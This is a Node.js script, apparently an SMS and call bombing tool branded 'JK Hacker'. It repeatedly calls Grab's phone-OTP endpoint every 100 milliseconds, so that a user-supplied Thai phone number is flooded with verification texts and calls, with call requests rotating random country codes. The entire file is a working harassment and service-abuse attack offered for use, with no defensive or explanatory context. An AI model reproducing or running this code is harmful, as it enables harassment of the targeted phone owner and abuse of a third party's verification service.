const chalk = require('chalk')
const figlet = require('figlet')

const inquirer = require('./lib/validate')
const spammer = require('./lib/spammer')

console.clear()
console.log(
    chalk.blue(
        figlet.textSync('JK Hacker', {
            font: 'Slant',
            horizontalLayout: 'default',
            verticalLayout: 'default'
        })
    )
)

const main = async () => {
    var ans = await inquirer()
    var countries = ['MY', 'SG', 'ID', 'TH', 'VN', 'KH', 'PH', 'MM']

    if (!ans.number.startsWith('66')) ans.number = `66${ans.number.substring(1, 10)}`

    setInterval(() => {
        Array.prototype.forEach.call(ans.method, (method) => {
            var data = {
                url: 'https://api.grab.com/grabid/v1/phone/otp',
                data: {
                    'method': method == 'CALL' ? 'CALL' : 'SMS',
                    'countryCode': method == 'CALL' ? countries[[Math.floor(Math.random() * countries.length)]] : 'TH',
                    'phoneNumber': ans.number,
                    'templateID': '',
                    'numDigits': 5
                }
            }
            spammer(data)
        })
    }, 100)
}

main()

process.on('SIGINT', () => {
    console.clear()
    process.exit()
})
